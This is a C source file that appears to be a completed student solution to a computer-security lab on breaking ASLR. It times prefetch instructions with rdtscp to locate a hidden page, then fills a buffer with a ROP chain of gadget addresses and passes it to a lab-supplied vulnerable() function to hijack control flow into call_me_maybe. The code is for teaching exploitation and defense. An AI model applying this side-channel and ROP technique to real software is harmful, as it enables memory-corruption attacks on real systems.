/*
 * Address Space Layout Randomization
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "lab.h"


void prefetch(void *p) {
    asm volatile ("prefetchnta (%0)" : : "r" (p));
    asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

void mem_fence() {
    asm volatile("mfence" ::: "memory");
}

uint64_t rdtscp1(uint32_t *cpu_id) {
    uint32_t lo, hi;
    uint32_t aux;

    // Use RDTSCP instruction to get the TSC and CPU ID
    asm volatile(
        "rdtscp"                 // Read the TSC and CPU ID
        : "=a"(lo), "=d"(hi), "=c"(aux)  // Output: lo (low), hi (high), aux (processor ID)
        :                          // No inputs
        : "memory"                // Memory clobbered
    );

    // Store CPU ID (processor ID) in the provided variable
    *cpu_id = aux;

    // Combine the low and high parts of the TSC into a 64-bit value
    return ((uint64_t)hi << 32) | lo;
}

// Same as in Part 2
extern void vulnerable(char *your_string);
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Your code:
uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
void do_overflow(uint64_t page_addr);

uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
	// Put your Part 1 code here
	// You are free to choose any of 1A, 1B, or 1C
	uint64_t valid_addr = 0;
    long min = 1 << 30;
    uint32_t cpu_s, cpu_e;
    long start , end , dt;
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        mem_fence();
        start = rdtscp1(&cpu_s);
        prefetch(addr);
        end = rdtscp1(&cpu_e);
        mem_fence();
        dt = end - start;
        if (dt < min) {
            min = dt;
            valid_addr = addr;
        }
        // TODO: Figure out if "addr" is the correct address or not.
    }
    return valid_addr;
}

/*
 * do_overflow
 * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
 */
void do_overflow(uint64_t page_addr) {

	// Put your Part 2 code here
	// Use the page you found with find_address
	// and the offsets located from objdump to find your gadgets
	// Same deal as Part 2A, except this time there's no win() method to call directly!
	uint64_t your_string[128];

	// Fill the array with 0xFF's and set the last character to be a new line.
	//memset(your_string, 0xFF, sizeof(your_string));
	your_string[127] = 0x000000000000000A;

	// For now we don't worry about ASLR, we can directly use these addresses:
	uint64_t gadget1_addr = page_addr;
	uint64_t gadget2_addr = page_addr + 16;
	uint64_t gadget3_addr = page_addr + 32;
	uint64_t gadget4_addr = page_addr + 48;
	uint64_t gadget5_addr = page_addr + 64;
	uint64_t gadget6_addr = page_addr + 80;
	uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;

	// Part 2B: Fill in your_string such that it configures the arguments
	// to call_me_maybe correctly, and then calls call_me_maybe.

	// Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
	// See gadgets.s for the gadget definitions.
	your_string[3]=gadget3_addr;
	your_string[4]=gadget5_addr;
	your_string[5]=gadget5_addr;
	your_string[6]=gadget6_addr;
	your_string[7]=gadget2_addr;
	your_string[8]=gadget1_addr;
	your_string[9]=191;
	your_string[10]=gadget4_addr;
	your_string[11]=call_me_maybe_addr;
	
	vulnerable((char *)your_string);
}

/*
 * lab_code
 * This is called by main with the bounds for the hidden page, just
 * like in Part 1. You will locate the page and then execute a ROP
 * chain using payloads located in the page.
 */
void lab_code(uint64_t low_bound, uint64_t high_bound) {
	uint64_t found_page = find_address(low_bound, high_bound);
	do_overflow(found_page);
}
